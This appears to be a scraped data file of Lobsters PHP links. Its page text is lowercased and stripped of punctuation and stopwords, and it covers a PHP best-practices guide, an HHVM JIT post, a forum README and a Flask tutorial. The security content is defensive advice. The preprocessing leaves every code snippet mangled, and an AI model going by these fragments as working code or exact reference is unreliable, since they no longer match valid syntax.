language like ruby extremely exception heavy whenever something go wrong http request failing db query go wrong even image asset could found ruby gem used throw exception screen meaning instantly know mistake php fairly lax call filegetcontents usually get false warning many older php framework like codeigniter return false log message proprietary log maybe let use method like upload geterror see went wrong problem go looking mistake check doc see error method class instead made extremely obvious another problem class automatically throw error screen exit process stop another developer able dynamically handle error exception thrown make developer aware error choose handle eg php email new fuelemail email subject subject email body heck email guy examplecom guy try email send catch fuelemailvalidationfailedexception e validation failed catch fuelemailsendingfailedexception e driver could send email finally executed regardless whether exception thrown normal execution resume spl exception generic exception class provides little debugging context developer however remedy possible create specialized exception type subclassing generic exception class php class validationexception extends exception mean add multiple catch block handle different exception differently lead creation lot custom exception could avoided using spl exception provided spl extension example use call magic method invalid method requested instead throwing standard exception vague creating custom exception could throw new badmethodcallexception web application security important every php developer learn basic web application security broken handful broad topic codedata separation data executed code get sql injection crosssite scripting localremote file inclusion etc code printed data get information leak source code disclosure case c program enough information bypass aslr application logic missing authentication authorization control input validation operating environment php version third party library operating system cryptography weakness bad people ready willing exploit web application important take necessary precaution harden web application security luckily fine folk open web application security project owasp compiled comprehensive list known security issue method protect must read securityconscious developer survive deep end php security padraic brady also another good web application security guide php password hashing eventually everyone build php application relies user login usernames password stored database later used authenticate user upon login important properly hash password storing hashing encrypting two different thing often get confused hashing irreversible oneway function produce fixedlength string feasibly reversed mean compare hash another determine came source string determine original string password hashed database accessed unauthorized thirdparty user account compromised unlike hashing encryption reversible provided key encryption useful area poor strategy securely storing password password also individually salted adding random string password hashing prevents dictionary attack use rainbow table reverse list crytographic hash common password hashing salting vital often user use password multiple service password quality poor additionally use specialized password hashing algorithm rather fast generalpurpose cryptographic hash function eg short list acceptable password hashing algorithm june use available php newer scrypt bcrypt php provides one see fortunately nowadays php make easy hashing password passwordhash php passwordhash introduced time using bcrypt strongest algorithm currently supported php updated future support algorithm needed though passwordcompat library created provide forward compatibility php hash string check hash new string two source string different secretpassword v badpassword login fail php require passwordphp passwordhash passwordhash secretpassword passworddefault passwordverify badpassword passwordhash correct password else wrong password passwordhash take care password salting salt stored along algorithm cost part hash passwordverify extract determine check password need separate database field store salt data filtering never ever ever trust foreign input introduced php code always sanitize validate foreign input using code filtervar filterinput function sanitize text validate text format eg email address foreign input anything get post form input data value server superglobal http request body via fopen php input r remember foreign input limited form data submitted user uploaded downloaded file session value cookie data data thirdparty web service foreign input foreign data stored combined accessed later still foreign input every time process output concatenate include data code ask data filtered properly trusted data may filtered differently based purpose example unfiltered foreign input passed html page output execute html javascript site known crosssite scripting x dangerous attack one way avoid x sanitize usergenerated data outputting page removing html tag striptags function escaping character special meaning respective html entity htmlentities htmlspecialchars function another example passing option executed command line extremely dangerous usually bad idea use builtin escapeshellarg function sanitize executed command argument one last example accepting foreign input determine file load filesystem exploited changing filename file path need remove null byte character file path load hidden nonpublic sensitive file sanitization sanitization remove escape illegal unsafe character foreign input example sanitize foreign input including input html inserting raw sql query use bound parameter pdo sanitize input sometimes required allow safe html tag input including html page hard many avoid using restricted formatting like markdown bbcode although whitelisting library like html purifier exists reason see sanitization filter unserialization dangerous unserialize data user untrusted source allow malicious user instantiate object userdefined property whose destructors executed even object used therefore avoid unserializing untrusted data absolutely must unserialize data untrusted source use php allowedclasses option restrict object type allowed unserialized validation validation ensures foreign input expect example may want validate email address phone number age processing registration submission see validation filter configuration file creating configuration file application best practice recommend one following method followed recommended store configuration information accessed directly pulled via file system must store configuration file document root name file php extension ensures even script accessed directly output plain text information configuration file protected accordingly either encryption groupuser file system permission good idea ensure commit configuration file containing sensitive information eg password api token source control register globals note php registerglobals setting removed longer used included warning anyone process upgrading legacy application enabled registerglobals configuration setting make several type variable including one post get request available global scope application easily lead security issue application effectively tell data coming example get foo would available via foo override variable declared using php make sure registerglobals error reporting error logging useful finding problem spot application also expose information structure application outside world effectively protect application issue could caused output message need configure server differently development versus production live development show every possible error development configure following setting phpini displayerrors displaystartuperrors errorreporting logerrors passing value show every possible error even new level constant added future php version eall constant also behaves way php phpnet estrict error level constant introduced part eall however became part eall mean term reporting every possible error version mean must use either eall estrict reporting every possible error php version eall eall estrict eall production hide error production environment configure phpini displayerrors displaystartuperrors errorreporting eall logerrors setting production error still logged error log web server shown user information setting see php manual testing writing automated test php code considered best practice lead wellbuilt application automated test great tool making sure application break making change adding new functionality ignored several different type testing tool framework available php use different approach trying avoid manual testing need large quality assurance team make sure recent change break existing functionality test driven development wikipedia testdriven development tdd software development process relies repetition short development cycle first developer writes failing automated test case defines desired improvement new function produce code pas test finally refactors new code acceptable standard kent beck credited developed rediscovered technique stated tdd encourages simple design inspires confidence several different type testing application unit testing unit testing programming approach ensure function class method working expected point build way development cycle checking value going various function method make sure internal logic working correctly using dependency injection building mock class stub verify dependency correctly used even better test coverage create class function create unit test behavior must basic level make sure error send bad argument make sure work send valid argument help ensure make change class function later development cycle old functionality continues work expected alternative would vardump testphp way build application large small use unit test contributing open source write test show broken functionality ie fails fix show test passing patch much likely accepted run project accepts pull request suggest requirement phpunit defacto testing framework writing unit test php application several alternative integration testing wikipedia integration testing sometimes called integration testing abbreviated phase software testing individual software module combined tested group occurs unit testing validation testing integration testing take input module unit tested group larger aggregate applies test defined integration test plan aggregate delivers output integrated system ready system testing many tool used unit testing used integration testing many principle used functional testing sometimes also known acceptance testing functional testing consists using tool create automated test actually use application instead verifying individual unit code behaving correctly individual unit speak correctly tool typically work using real data simulating actual user application selenium mink codeception fullstack testing framework includes acceptance testing tool storyplayer fullstack testing framework includes support creating destroying test environment demand behavior driven development two different type behaviordriven development bdd specbdd storybdd specbdd focus technical behavior code storybdd focus business feature behavior interaction php framework type bdd storybdd write humanreadable story describe behavior application story run actual test application framework used php application storybdd behat inspired ruby cucumber project implement gherkin dsl describing feature behavior specbdd write specification describe actual code behave instead testing function method describing function method behave php offer phpspec framework purpose framework inspired rspec project ruby bdd link behat storybdd framework php inspired ruby cucumber project phpspec specbdd framework php inspired ruby rspec project codeception fullstack testing framework us bdd principle server deployment php application deployed run production web server number way platform service paas paas provides system network architecture necessary run php application web mean little configuration launching php application php framework recently paas become popular method deploying hosting scaling php application size find list php paas platform service provider resource section virtual dedicated server comfortable system administration interested learning virtual dedicated server give complete control application production environment nginx phpfpm php via php builtin fastcgi process manager fpm pair really nicely nginx lightweight highperformance web server us le memory apache better handle concurrent request especially important virtual server much memory spare apache php php apache long history together apache wildly configurable many available module extend functionality popular choice shared server easy setup php framework open source apps like wordpress unfortunately apache us resource nginx default handle many visitor time apache several possible configuration running php common easiest setup prefork mpm memory efficient simplest get working use probably best choice want dig deeply server administration aspect note use must use prefork mpm alternatively want squeeze performance stability apache take advantage fpm system nginx run worker mpm event mpm modfastcgi modfcgid configuration significantly memory efficient much faster work set running apache later use modproxyfcgi get great performance easy setup shared server php shared server thank popularity hard find host without php installed sure latest version shared server allow developer deploy website single machine upside become cheap commodity downside never know kind ruckus neighboring tenant going create loading server opening security hole main concern project budget afford avoid shared server make sure shared server offering latest version php check php version building deploying application find manual database schema change running test manually updating file manually think twice every additional manual task needed deploy new version app chance potentially fatal mistake increase whether dealing simple update comprehensive build process even continuous integration strategy build automation friend among task might want automate dependency management compilation minification asset running test creation documentation packaging deployment deployment tool described collection script handle common task software deployment deployment tool part software act software outside many open source tool available help build automation deployment written php others hold back using better suited specific job example phing control packaging deployment testing process within xml build file phing based apache ant provides rich set task usually needed install update web application extended additional custom task written php solid robust tool around long time however tool could perceived bit old fashioned way deal configuration xml file capistrano system intermediatetoadvanced programmer execute command structured repeatable way one remote machine preconfigured deploying ruby rail application however successfully deploy php system successful use capistrano depends working knowledge ruby rake ansistrano couple ansible role easily manage deployment process deploy rollback scripting application php python ruby ansible port capistrano used quite lot php company already rocketeer get inspiration philosophy laravel framework goal fast elegant easy use smart default feature multiple server multiple stage atomic deploys deployment performed parallel everything tool hot swapped extended everything written php deployer deployment tool written php simple functional feature include running task parallel atomic deployment keeping consistency server recipe common task symfony laravel zend framework yii available younes rafie article easy deployment php application deployer great tutorial deploying application tool magallanes another tool written php simple configuration done yaml file support multiple server environment atomic deployment built task leverage common tool framework reading server provisioning managing configuring server daunting task faced many server tool dealing automate infrastructure make sure right server configured properly often integrate larger cloud hosting provider amazon web service heroku digitalocean etc managing instance make scaling application lot easier ansible tool manages infrastructure yaml file simple get started manage complex large scale application api managing cloud instance manage dynamic inventory using certain tool puppet tool language file type managing server configuration used masterclient setup used masterless mode masterclient mode client poll central master new configuration set interval update necessary masterless mode push change node chef powerful ruby based system integration framework build whole server environment virtual box integrates well amazon web service service called opsworks reading continuous integration continuous integration software development practice member team integrate work frequently usually person integrates least daily leading multiple integration per day many team find approach lead significantly reduced integration problem allows team develop cohesive software rapidly martin fowler different way implement continuous integration php travis ci done great job making continuous integration reality even small project travis ci hosted continuous integration service open source community integrated github offer first class support many language including php reading virtualization running application different environment development production lead strange bug popping go live also tricky keep different development environment date version library used working team developer developing window deploying linux anything nonwindows developing team consider using virtual machine sound tricky besides widely known virtualization environment like vmware virtualbox additional tool may help setting virtual environment easy step vagrant vagrant help build virtual box top known virtual environment configure environment based single configuration file box set manually use provisioning software puppet chef provisioning base box great way ensure multiple box set identical fashion remove need maintain complicated set command list also destroy base box recreate without many manual step making easy create fresh installation vagrant creates folder sharing code host virtual machine mean create edit file host machine run code inside virtual machine little help need little help start using vagrant service might useful puphpet simple gui set virtual machine php development heavily focused php besides local vms used deploy cloud service well provisioning made puppet protobox layer top vagrant web gui setup virtual machine web development single yaml document control everything installed virtual machine phansible provides easy use interface help generate ansible playbook php based project docker docker lightweight alternative full virtual machine called container container building block simplest case one specific job eg running web server image package use build container docker repository full typical lamp application might three container web server phpfpm process mysql shared folder vagrant leave application file tell docker find generate container command line see example ease maintenance build dockercomposeyml file project specifying create communicate one another docker may help developing multiple website want separation come installing virtual machine necessary disk space time keep everything date efficient installation downloads quicker need store one copy image however often used container need le ram share o kernel server running simultaneously take matter second stop start need wait full server boot example running php application docker installing docker machine start web server one command following download fully functional apache installation latest php version map pathtoyourphpfiles document root view http docker run name myphpwebserver p v pathtoyourphpfiles varwwwhtml php apache initialize launch container make run background stop start simply run docker stop myphpwebserver docker start myphpwebserver parameter needed learn docker command show quick way run basic server much thousand prebuilt image docker hub take time learn terminology read docker user guide get run random code downloaded without checking safe unofficial image may latest security patch doubt stick official repositiories phpdockerio site autogenerate file need fullyfeatured lamplemp stack including choice php version extension caching php pretty quick bottleneck arise make remote connection load file etc thankfully various tool available speed certain part application reduce number time various timeconsuming task need run opcode cache php file executed must first compiled opcodes machine language instruction cpu source code unchanged opcodes compilation step becomes waste cpu resource opcode cache prevents redundant compilation storing opcodes memory reusing successive call typically check signature modification time file first case change likely opcode cache make significant speed improvement application since php one built zend opcache depending php packagedistribution usually turned default check opcacheenable output phpinfo make sure earlier version pecl extension read opcode cache object caching time beneficial cache individual object code data expensive get database call result unlikely change use object caching software hold piece data memory extremely fast access later save item data store retrieve pull directly cache following request gain significant improvement performance well reduce load database server many popular bytecode caching solution let cache custom data well even reason take advantage apcu xcache wincache provide apis save data php code memory cache commonly used memory object caching system apcu memcached apcu excellent choice object caching includes simple api adding data memory cache easy setup use one real limitation apcu tied server installed memcached hand installed separate service accessed across network meaning store object hyperfast data store central location many different system pull note running php fast cgi application inside webserver every php process cache ie apcu data shared worker process case might want consider using memcached instead tied php process networked configuration apcu usually outperform memcached term access speed memcached able scale faster expect multiple server running application need extra feature memcached offer apcu probably best choice object caching example logic using apcu php check data saved expensivedata cache data apcfetch expensivedata data false data cache save result expensive call later use apcadd expensivedata data getexpensivedata printr data note prior php apc provides object cache bytecode cache apcu project bring apc object cache php since php builtin bytecode cache opcache learn popular object caching system phpdoc phpdoc informal standard commenting php code lot different tag available full list tag example found phpdoc manual example might document class method php author name aname examplecom link http wwwphpdocorgdocslatestindexhtml class datetimehelper param mixed anything anything convert datetime object throw invalidargumentexception return datetime public function datetimefromanything anything type gettype anything switch type code try return datetime object throw new invalidargumentexception failed converting param type type datetime object param mixed date anything convert datetime object return void public function date echo datetimefromanything date format c param mixed date anything convert datetime object public function date echo datetimefromanything date format r documentation class whole author tag link tag author tag used document author code repeated documenting several author link tag used link website indicating relationship website code inside class first method param tag documenting type name description parameter passed method additionally return throw tag documenting return type exception could thrown respectively second third method similar single param tag first method important difference second third method doc block inclusionexclusion return tag return void explicitly informs u return historically omitting return void statement also result return action people follow difficult find interesting knowledgeable php community member first starting find abbreviated list php community member get started php paas provider see version paas host running head php version framework rather reinvent wheel many php developer use framework build web application framework abstract away many lowlevel concern provide helpful easytouse interface complete common task need use framework every project sometimes plain php right way go need framework three main type available micro framework fullstack framework component framework microframeworks essentially wrapper route http request callback controller method etc quickly possible sometimes come extra library assist development basic database wrapper like prominently used build remote http service many framework add considerable number feature top available microframework called fullstack framework often come bundled orms authentication package etc componentbased framework collection specialized singlepurpose library disparate componentbased framework used together make micro fullstack framework component mentioned component another approach common goal creating distributing implementing shared code various component repository exist main two repository command line tool associated help installation upgrade process explained detail dependency management section also componentbased framework componentvendors offer framework project provide another source package ideally little dependency package specific framework example use fuelphp validation package without needing use fuelphp framework laravel illuminate component become better decoupled laravel framework component best decoupled laravel framework listed useful resource cheatsheets php cheatsheets variable comparison arithmetic variable testing various php version owasp security cheatsheets provides concise collection high value information specific application security topic best practice news around php web development community subscribe weekly newsletter keep informed new library latest news event general announcement well additional resource published every also weekly platform might interested list php universe video tutorial youtube channel paid video book many php book sadly quite old longer accurate particular avoid book php version never exist next major release php php partly section aim living document recommended book php development general would like book added send pr reviewed relevancy free book paid book build apis hate everyone dog want api probably learn build modern php cover modern php feature best practice testing tuning deployment setting dev environment building secure php apps learn security basic senior developer usually acquires year experience condensed one quick easy handbook modernizing legacy application php get code control series small specific step securing php core concept guide common security term provides example every day php scaling php stop playing sysadmin get back coding signaling php pcnlt signal great help writing php script run command line minimum viable test longtime php testing evangelist chris hartjes go feel minimum need know get started domaindriven design php see real example written php showcasing domaindriven design architectural style hexagonal architecture cqrs event sourcing tactical design pattern bounded context integration php user group live larger city odds php user group nearby easily find local pug phpug alternate source might meetupcom search php user group near using favorite search engine ie google live smaller town may local pug case start one special mention made two global user group nomadphp phpwomen nomadphp offer twice monthly online user group meeting presentation top speaker php community phpwomen nonexclusive user group originally targeted towards woman php world membership open everyone support diverse community phpwomen provide network support mentorship education generally promote creating female friendly professional atmosphere read user group php wiki php conference php community also host larger regional national conference many country around world wellknown member php community usually speak larger event great opportunity learn directly industry leader find php conference elephpants elephpant beautiful mascot php project elephant design originally designed php project vincent pontier spiritual father thousand elephpants around world year later adorable plush elephant toy came birth well elephpants present many php conference many php developer computer fun inspiration interview vincent pontier
282,Lobsters,php,PHP programming,WordPress Ajax and Login Redirects » WP Theme Tutorial,http://wpthemetutorial.com/2012/12/04/wordpress-ajax-and-login-redirects/,wordpress ajax login redirects wp theme tutorial,welcome wpthemetutorialcom,welcome wpthemetutorialcom domain parked free charge namesilocom namesilo offer cheapest domain internet well free whois privacy free parking keep revenue industry leading domain security powerful domain management tool fast simple easy process api access hidden fee
283,Lobsters,php,PHP programming,Speeding up PHP-based development with HipHop VM,https://www.facebook.com/notes/facebook-engineering/speeding-up-php-based-development-with-hiphop-vm/10151170460698920,speeding phpbased development hiphop vm,announced performance wwwfacebookcom development environment open source public github repository getting wordpress running hhvm improving jit hhbc facebookcom wwwfacebookcom itlb road ahead find hhvm open source project hhvmcom related article link,facebook hiphop team constantly strives improve efficiency php execution increase productivity php developer late announced pursuing justintime jit compilation approach called hhvm successor compiler called hphpc goal hhvm project twofold build productionready virtual machine delivers superior performance unify production development environmentsbelow update state hhvm followed deep dive detail hhvm architecture optimization strategiesperformance year pushed make hhvm efficient hphpc massive php code base hphpc tough act follow lot effort put optimizing performance delivered significant efficiency gain year matching hphpc performance difficult requirement satisfy hhvm could used serve production traffic scalewe happy announce hhvm fast hphpc hhvm dynamic translation technique aka jit extremely motivated team key winning race chart show efficiency hhvm relative hphpc past month generating home page wwwfacebookcom hhvm performance overtaking hphpc continuing upward trajectory hiphop team gearing migrate production machine hphpc hhvmthe development environmentprior hhvm development environment call sandbox used custombuilt php interpreter called hphpi shortcut long slow hphpc compilation cycle provide rapid edit save run development workflow hphpi flexible slow slower zend engine hphpc replaced developer around like move fast starting see hphpi strain load complex product feature like timeline tickerwe deployed hhvm sandbox reduced page load time compared hphpi keeping rapid workflow hphpi provided hhvm fully deployed production achieved goal unifying production development environment enable php developer debug tune iterate system run production also allow hiphop team focus improving single system benefit environment simultaneouslyopen source sharing benefit php development stack community important rebooted open source effort july resumed regularly updating public github repository targeted ubuntu precise centos start planning add support platform including mac o x futurewhile efficiency facebook code base priority right started investing making sure able correctly run popular php code base hhvm run latest version wordpress see getting wordpress running hhvm proudly using serve new team blog making sure hhvm able run common php application framework hoping make useful broader php community outside facebook given hhvm support development deployment workflow similar zend php stack think hhvm important step forward reducing friction adoptionimproving jit working make jit efficient faced interesting challenge traditional profiling optimization technique always sufficient improving complex software system virtual machine finding gain hard work required lot experiment many produce positive result time result surprising frustratinghere thing improve jit instruction set coverage hhvm run php program converting php source bytecode hhbc executing bytecode using bytecode interpreter jit compiler seamlessly interoperate jit used possible interpreter used execution engine last resort end jit supported common bytecode instruction input type long tail le common instruction type caused jit transfer control interpreter long tail limiting hhvm performanceduring added jit support many le common instruction input type notably implemented full jit support member instruction instruction accessing array element object property php semantics element access property access complex design member instruction reflects complexity php evaluation order expression involving chain element property access fit nicely hhbc stack model member instruction crafted chain element access property access executed single member instruction furthermore behavior element property expression depends context hhbc several different member instruction accommodate different context example statement x f g j k converted bytecode like fpushfuncd f fcall unboxr fpushfuncd g fcall unboxr fpushfuncd j fcall unboxr fpushfuncd k fcall unboxr cgetm ec ec setm ec ec popcthe first instruction evaluate expression f g j k cgetm instruction offset performs element access righthand side setm instruction offset performs element access lefthand side setm instruction performs assignmentsince hhbc different member instruction one encode arbitrarily long chain element property access adding full jit support instruction essentially required writing minitranslator could handle combination element property access context member instruction broken series simpler operation machine code generated operation passing intermediate result one operation nextall told implementing full jit support member instruction reduced cpu time still room optimization areaside exit hhvm jit us tracebased form compilation limit trace single basic block input type known translation time tracelet approach pushed make jit robust enough use developer sandbox came across tricky bug challenged jit singleentrysingleexit modelconsider following example suppose jit need generate translation line function dosomething val extra global base extra null return base val tracelet approach work observing type local beginning line generating specialized code based type local like tracelet begin guard code shown yellow make sure base val integer entering body shown green one might assume check would sufficient lifetime tracelet many simple operation php capable side effect affect correctness safety example assignment operation line may invoked destruct method turn may changed type base mean safely assume base still integer line dosomething function contrived example encountered realworld instance bug variety form needed way fix preferably without hurting performance decided address issue enhancing jit capable generating side exit like idea behind side exit allow execution bail tracelet part way rare condition arises type aliased local changing conceptually jit still limit trace single basic block main exit usually taken also capable generating side exit handle uncommon casestype prediction return type implementing side exit mechanism sought opportunity could leverage side exit make tracelets longer thereby reducing performance overhead tracelet boundary extending cpu mechanical sympathy effect longer chain continuous code execution basic block contained several php method call noticed jit often generated several short tracelets return type method call known translation time consider following example php code abstract class c function addtwonumbers return one two hhbc fpushobjmethodd one fcall unboxr fpushobjmethodd two fcall unboxr add retcsuppose one two return integer run time return type known translation time translating addtwonumbers method original implementation would generate series tracelets shown figure belowas experiment modified hhvm profile method call return type first web request running bytecode interpreter modified jit make conservative type prediction based profile information using side exit handle case prediction fail using type prediction jit generate single tracelet cover entire body addtwonumbers shown figure type prediction function call method call return type produced reduction cpu time running facebookcom sitechanging parallel tracelets link together one core idea behind jit tracelet approach ability generate multiple tracelets given source location accommodate different input type multiple tracelets generated source location referred parallel tracelets linked chain via conditional branchesin original implementation new parallel tracelet generated linked head chain example suppose simple function foo x called twice passing integer first time passing string second time tracelet generated first invocation tracelet generated second invocation b would linked together chain like experiment tried changing jit link new parallel tracelets end chain instead linking head new scheme tracelets b would chain together like linking new parallel tracelets end chain produced unexpectedly large reduction cpu time approximately time ran experiment surprised result digging hardware counter hhvm internal counter understand win came fromhhvm counter track many time tracelet guard entered many time tracelet body entered dividing latter former compute tracelet success rate generating home page wwwfacebookcom linking new tracelets head chain produce tracelet success rate linking end chain produce tracelet success rate help explain change produce win fully explain large effectthe hardware counter give insight happening processor level many hardware counter showed improvement drop itlb miss really stood lower tracelet success rate mean processor performing jump across different page memory put pressure itlb increase miss rate itlb miss cause processor walk page table called page walk page walk particularly computeintensive large application like facebook site page table big exceeds capacity lastlevel cache llc make sense cutting itlb miss half would large effect cpu timethis surprising win inspired u spend energy looking llc miss code locality hardware resource issue see low hanging fruit areathe road aheaddeploying hhvm production end goal rather mean continue improving performance php code base going forward hhvm enables u pursue broader range optimization strategy php development stack runtime base library apis baremetal machine code generate plan leverage flexibility make facebook web tier even efficient coming yearswe also excited continue improving hhvm development experience making installation development workflow easier flexible supporting wider range popular php application frameworksfind hhvmhhvm open source project developed facebook latest news hhvm find u hhvmcomrelated article linksdrew paroski software engineer hiphop team facebook
284,Lobsters,php,PHP programming,Organizing Your WordPress Theme Files » WP Theme Tutorial,http://wpthemetutorial.com/2012/11/27/organizing-your-wordpress-theme-files/,organizing wordpress theme file wp theme tutorial,welcome wpthemetutorialcom,welcome wpthemetutorialcom domain parked free charge namesilocom namesilo offer cheapest domain internet well free whois privacy free parking keep revenue industry leading domain security powerful domain management tool fast simple easy process api access hidden fee
286,Lobsters,php,PHP programming,I Forgot Your Password: Randomness Attacks Against PHP Applications,http://www.youtube.com/watch?v=yE0qTTi-_iQ,forgot password randomness attack php application,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature
287,Lobsters,php,PHP programming,5 commands to be a better PHP developer - while(true),http://tydeas.tumblr.com/post/29226598941/git-pre-commit-php-psr-standard,command better php developer true,command better php developer,command better php developer
288,Lobsters,php,PHP programming,NoNonsense Forum: A database-free PHP-based simple discussion forum,https://github.com/Kroc/NoNonsenseForum,nononsense forum databasefree phpbased simple discussion forum,http camendesigncomnononsenseforum,nononsense forum copyright ccby kroc camen simple forum focus discussion simplicity http camendesigncomnononsenseforum nononsense differs forum database thread r feed reply added new item added feed hoop jump registration email confirmation captcha type message give name password want use post made use name password pair future keep name simple clutter user profile status update signature user rank pure discussion none cruft content admin moderator set signin thing note post appending post deleting subforums lock sticky thread forum locking member note private forum acknowledgement admin moderator set first thing need provide username admin moderator would like create modstxt file forum subforum user name first line forum admin add user name mod separate line eg kroc theraje speedojoe mod root forum modstxt moderate subforums including locked one mod subforums newsmodstxt moderate subforum note make sure admin mod account created posting otherwise anybody could steal name take control signin moderator action require user signin click sign link bottom page enter name password thread locked unlocked relevant link bottom page signed must quit browser fully close tab window clear browser cache sign unfortunately due flaw http authentication user accented unicode letter name able signin moderator member must limit chosen name basic letter number punctuation thing note post appending thread r feed text html conversion happens post oneway edit post manually editing r file instead text appended end post user append post moderator append post post deleting avoid abuse user permanently delete post user deletes post text removed replaced message like post deleted owner moderator name time remains moderator delete post likewise blankedout deleted post removed permanently thread moderator deleting post last page reply break permalinks rearranging page boundary subforums subforums simply folder name folder name subforum contain letter allowed server o except make sure folder writepermissions nested subfolders supported reasonable depth eg musictechno lock sticky thread locked thread replied sticky thread remain top forum regardless page unlock unsticky thread first signin admin click unlock unsticky thread button forum locking root forum subforums individually restricted create lockedtxt file forum subforum file write one following word sansquotes thread moderator member forum start new thread anybody reply post moderator member forum start new thread reply anybody view forum wo nt able post unless added member moderator member member user restricted locked forum moderator power participant restricted forum create memberstxt file forum subforum add user name member separate line member root forum automatically member subforums unlike mod member must signin able post locked forum note private forum nononsense forum provide option private forum accessed member index r feed includes text post made forum protected without use htpasswd based passwordprotection want private forum subforum protect relevant directory using htpasswd instruction provided configure htpasswd protection requires basic server admin skill knowledge using htaccess file user defined htpasswd file password nononsense forum username acknowledgement see licencetxt licence detail like thank following individual suggesting idea contributing directly nononsense forum like also thank user camen design forum forumcamendesigncom testing support name issue github discovering path error sitemapxml dot vn zuchto suggestion improve transliteration fallback iconv missing bruno héridet duplicate id html major domtemplate bug munging querystrings david hund code typo domdocument major domtemplate bug munging querystrings folderol reporting apache noyb identifier fyra idn url character longer hexencoded output gardener critical typo langexamplephp jbark use clearstatcache ensure index ordering right accidental double link favicon jj wrong usage php header function add noindex nofollow delete page blockquote syntax idea jon gjengset jonhoo original grayscale theme original mobile theme alternative syntax code block readlocking thread writes help http support raised issue php short tag delete message deleting thread post many html cs fix jose pedro arvela jparvela changing static self suggestion user syntax macsupportgr regex backtrace limit martijnzegnat lynx support use rel nofollow external external link improved htaccess compatibility mac o titleline self link quite complex duplicate appends help various transliteration aspect better whitespace trimming help fixing missing nohtaccess url constant support improving handling major domtemplate bug munging querystrings nkrs opera speed dial help nicolai unecessary chromeframe header htaccess nikolai changing static self opera speed dial help oldtimes original suggestion transliterate thread title paul lock button sometimes showing accident philip butkiewicz fix script outputting domtemplate richard van velzen rvanvelzen running subfolder http support remove user robotstxt cs fix inline code heading divider markup implementation fault adding new thread url parsing subdomains containing dash stripped code span block suggestion improve error message closing bracket url url last text quote block quote regex fix post starting code block nt show block sani better tag matching repairing output html stickies showing thread add leading expires header comply spec debugging domtemplate speed suggestion hidpi graphic starbeamrainbowlab discovering missing nohtaccess url stephen taylor reported bug appends doubleencoding html name working htaccess steve bir page working sub forum tcb io testing rotation zooming bug temukki delete page missing timezone option anybody else forgotten along way get touch
289,Lobsters,php,PHP programming,Quick doesn't have to mean dirty,http://me.veekun.com/blog/2012/07/28/quick-doesnt-mean-dirty/,quick nt mean dirty,techcrunch fuck flask hammer sickle documentation use sqlalchemy first choice instruction quickstart guide instruction flask http pay money god know else github indicate even le reliable,techcrunch anyway sympathy php deviltry appreciate ethos justgetitdone attitude melvin tercan put recent blog post php misfit pragmatic one would pick anything even doubleclawed hammer build future often ridiculed belittled hip guy class write cool code ruby python always one get shit done something best enemy good shipping working php code approximately million time better designing something mindblowing haskell never actually ship fully support jeff atwood call replace php hope everyone realizes eliminating many many multitudinous flaw enough somehow duplicate justmakeitwork ethos recurring sentiment developer telling well yeah python may cool ivory tower man like want write program say fuck people smoking whence come belief anything claimed better tool must hellacious academiconly monstrosity actively resists realworld use hey sick talking php let talk python honor let make guestbook flask thing use get running quickly let think actually built real thing flask fun time even real time eevee perushian devblog cd dev eevee perushian dev mkdir guestbookdemo eevee perushian dev cd guestbookdemo eevee perushian devguestbookdemo git init initialized empty git repository homeeeveedevguestbookdemogit eevee perushian devguestbookdemo mkdir guestbookdemo eevee perushian devguestbookdemo touch guestbookdemoinitpy eevee perushian devguestbookdemo install user flask yes shell prompt end flower root hammer sickle make directory make git repository make blank python namespace stick like start package thing named app gross entirely optional install flask user installs home directory probably could gotten package manager lazy look say arch linux super special snowflake considers python default python okay write code look boilerplate copy flask front page oh future import absoluteimport unicodeliterals flask import flask app flask name approute def root return wow totally useless far future import absoluteimport guestbookdemoapp import app apprun half done unnecessary future stuff make python behavior little nicer made file called main run app guestbookdemo love also avoids name main incantation fire eevee perushian devguestbookdemo guestbookdemo running http click link website hey even install apache well first thing first perushian devguestbookdemo vim gitignore pyc swp eevee perushian devguestbookdemo git add guestbookdemo eevee perushian devguestbookdemo git add gitignore eevee perushian devguestbookdemo git commit initial commit master rootcommit initial commit file changed insertion create mode gitignore create mode guestbookdemoinitpy create mode guestbookdemomainpy create mode guestbookdemoapppy okay template hurriedly consult documentation blah blah autoescaping use okay flask look template template directory default eerily convenient doctype html html lang en head title block pagetitle endblock title head body section id content block content endblock section footer id footer cool guestbook forever footer body html extends basehtml block title guestbook endblock block content guestbook p hello welcome guestbook p ul class guest li li ul endblock update python side approute def root return rendertemplate indexhtml template hey bad could stand data though learned something made typo template flask live debugging set debugtrue run also provides automatic code reloading unfortunately due arcane interaction reloader python behavior use pythonpath guestbookdemo run app boo look silly problem inflicted get following tutorial incidentally seems putting code package oughta hardcode package name instead using name documentation flask class explains app flask guestbookdemo like sqlalchemy could write bunch query hand something simple like honestly fuck noise first need database createdb postgresql thing amazed ballsy claiming generic name like eevee perushian devguestbookdemo createdb guestbookdemo need anything fancy arranging db code either credential go configuration yadda yadda since really need credential postgres authenticate using local unixy login care datetime sqlalchemy import createengine sqlalchemyextdeclarative import declarativebase sqlalchemyorm import scopedsession sessionmaker sqlalchemyschema import column sqlalchemytypes import datetime integer unicode engine createengine postgresql guestbookdemo session scopedsession sessionmaker bindengine autoflushfalse base declarativebase bindengine yonder table class guestbookentry base tablename guestbookentries id column integer primarykeytrue nullablefalse timestamp column datetime nullablefalse indextrue name column unicode nullablefalse message column unicode nullablefalse def init self kwargs kwargssetdefault timestamp datetimeutcnow super guestbookentry self init kwargs give threadsafe transaction support canonical copy schema rather little effort magic intuited sqlalchemy hilariously extensive documentation thing note flasksqlalchemy package could used save couple line boilerplate automatically handle configuration pretty comfortable sqlalchemy added custom init set timestamp new entry current time utc always always utc set autoflushfalse batched update really matter nice beginning also scopedsession gross thing make single session variable multiplex across thread requires knowing done thread session need little guy apppy appteardownrequest def shutdownsession exceptionnone dbsessionremove one thing flasksqlalchemy would done c est la vie create table perushian devguestbookdemo python default apr gcc prerelease type help copyright credit license information guestbookdemo import db dbbasemetadatacreateall binddbengine eevee perushian devguestbookdemo psql guestbookdemo psql type help help guestbookdemo dt list relation schema name type owner public guestbookentries table eevee row okay getting somewhere useful yet let add data display guestbookdemo insert guestbookentries value default time zone utc eevee hello ur web sight insert approute def root todo paginate entry dbsessionquery dbguestbookentry orderby dbguestbookentrytimestampdesc return rendertemplate indexhtml entriesentries ul class guest entry entry li blockquote entrymessage blockquote p cite entryname cite time entrytimestamp time p li endfor ul flask reloads need refresh page noticed page title called block pagetitle base template title inheriting template also import datetime dbpy datetime import datetime utcnow method class function module wish module class named inbrowser stack trace 